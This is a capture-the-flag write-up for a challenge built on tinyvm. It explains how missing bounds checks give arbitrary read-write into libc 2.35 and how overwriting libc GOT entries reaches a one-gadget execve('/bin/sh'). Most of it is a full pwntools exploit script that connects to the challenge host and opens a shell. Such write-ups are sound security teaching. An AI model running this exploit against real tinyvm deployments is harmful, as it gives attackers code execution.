# tinyvm

We are given only `nc 198.11.180.84 6666`. There, we are prompted for a file to pwn [tinyvm](https://github.com/jakogut/tinyvm). Tinyvm runs run programs that are written in an x86 asm like syntax.

Looking at the tinyvm source, we noticed three things:
1. Bound checks pretty much just don't exist.
2. The 64MiB vm memory is simply malloced. Meaning that, because of it's size, it will end up in a mmapped region directly before the libc.
3. We can only address stuff with either an integer literal or esp. Since we needed to dynamically compute addresses while exploring the remote, we ended up scripting that and using esp-based memory accesses everywhere.

Meaning that, despite ASLR, we have arbitrary read-write in the vm memory, libc and ld.

Since we still didn't know anything about the remote system, we first used the arb read to dump the remote libc. Which turned out to be `GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.` 

So now we have arbitrary read-write in libc 2.35. An easy way to get shell is to overwrite .got table entries in libc and call `__libc_message` to execute one gadgets. Check [this](https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc) for more details. Unfortunately, at first glance, none of the available one gadgets seemed to fit any of the calls we were able to reach. But we did find out a way to make it work.

```
# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

.text:0000000000077AE7                 mov     rdx, r14
.text:0000000000077AEA                 mov     rsi, rbp
.text:0000000000077AED                 mov     rdi, rbx
.text:0000000000077AF0                 call    j_mempcpy
```

We overwrite .got+0x40(j_mempcpy) with offset `0xebcf8` and `.got+0x98` with offset `0x77AE7` so that it first jumps to `0x77AE7` to clear out registers before jumping to one gadget. And it works!

After adapting offsets in the same machine as remotely, one gadget works smoothly on the remote machine.

```python
#coding:utf-8
from pwn import *
from time import sleep


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

stack_to_libc_offset = 0x3e03ff0

def write_libc(offset, value):
    assert offset % 4 == 0
    instructions = []
    instructions.append(f"add esp, {stack_to_libc_offset + offset + 4 }")
    instructions.append(f"mov eax, {value}")
    instructions.append(f"push eax")
    instructions.append(f"sub esp, {stack_to_libc_offset + offset }")
    return instructions

def add_libc(offset, value):
    assert offset % 4 == 0
    instructions = []
    instructions.append(f"add esp, {stack_to_libc_offset + offset }")
    instructions.append(f"pop eax")
    #instructions.append(f"prn eax")
    instructions.append(f"add eax, {value}")
    #instructions.append(f"prn eax")
    instructions.append(f"push eax")
    instructions.append(f"sub esp, {stack_to_libc_offset + offset }")
    return instructions

def corrupt_memory_region():
    instructions = []
    instructions.append(f"add esp, {-0x200008}")
    instructions.append(f"pop eax")
    instructions.append(f"mov eax, {0xffffffff}")
    instructions.append(f"push eax")
    instructions.append(f"sub esp, {-0x200008 }")
    return instructions


got_plt_base = 0x00219000



def gen_find_got_plt_crashes_program():
    instructions = []
    instructions.append("prn esp")
    #instructions += corrupt_memory_region()
    #instructions += write_libc(0x26f004,0x41414141)

    for i in range(0, 0x1c8, 8):
        if(i in [0xb8]):
            continue
        instructions += write_libc(got_plt_base+i,i)

    instructions.append("prn esp")
    return '\n'.join(instructions)




x98_offset = 0x19d960
x40_offset = 0x1a0890


def gen_single_override_program(one_gadget,got_entry, original_got_offset):
    instructions = []
    instructions += corrupt_memory_region()
    instructions += add_libc(got_plt_base+got_entry,one_gadget-original_got_offset)
    #instructions.append("prn esp")
    return '\n'.join(instructions)

def gen_program(content_1, entry_1, offset_1, content_2, entry_2, offset_2):
    instructions = []
    instructions += corrupt_memory_region()
    instructions += add_libc(got_plt_base + entry_1, content_1 - offset_1)
    instructions += add_libc(got_plt_base + entry_2, content_2 - offset_2)
    #instructions.append("prn esp")
    return '\n'.join(instructions)


def find_crashes():
    with open('program.vm', 'w') as f:
        p = gen_find_got_plt_crashes_program()
        info(p)
        f.write(p)
    io = start()
    #print(hex(io.libc.address + got_plt_base+0x40))

    io.interactive()


def try_remote():
    # p = gen_program(0xebcf8, 0x40, x40_offset, 0x77AE7, 0x98, x98_offset)
    p = gen_program(0xdd688, 0x40, x40_offset, 0x63227, 0x98, x98_offset)
    # info(p)
    # print(p)
    r = connect("198.11.180.84", 6666)
    r.sendlineafter("4096) :", str(len(p)))
    r.send(p)

    r.interactive()

try_remote()

```

`rwctf{A_S1gn_In_CHllenge}`
